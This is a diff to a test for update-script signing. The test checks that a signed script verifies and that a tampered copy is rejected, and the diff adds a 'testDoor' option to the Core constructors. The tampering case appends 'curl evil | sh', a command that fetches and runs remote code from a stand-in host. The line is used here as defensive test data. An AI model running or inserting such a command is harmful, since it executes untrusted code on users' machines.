@@ -13,7 +13,7 @@ const tmp = () => mkdtempSync(path.join(os.tmpdir(), 'aang-sign-'));
 
 test('M4: the PC signs, the Mac can check, a changed script fails', async () => {
   const stateDir = tmp();
-  const c: any = new Core({ port: 48220, dataDir: tmp(), stateDir, warm: false, consolidate: false });
+  const c: any = new Core({ testDoor: true, port: 48220, dataDir: tmp(), stateDir, warm: false, consolidate: false });
   const { key, pub } = c.updateKey();
   assert.match(pub, /BEGIN PUBLIC KEY/);
   assert.match(readFileSync(path.join(stateDir, 'mac-update-sign.pem'), 'utf8'), /BEGIN PRIVATE KEY/, 'kept in the state folder');
@@ -22,7 +22,7 @@ test('M4: the PC signs, the Mac can check, a changed script fails', async () => 
   const sig = sign(null, Buffer.from(script), key);
   assert.equal(verify(null, Buffer.from(script), pub, sig), true);
   assert.equal(verify(null, Buffer.from(script + 'curl evil | sh\n'), pub, sig), false, 'a changed script fails');
-  const c2: any = new Core({ port: 48221, dataDir: tmp(), stateDir, warm: false, consolidate: false });
+  const c2: any = new Core({ testDoor: true, port: 48221, dataDir: tmp(), stateDir, warm: false, consolidate: false });
   assert.equal(c2.updateKey().pub, pub, 'the same key every start');
   c.memory.close(); c2.memory.close();
 });
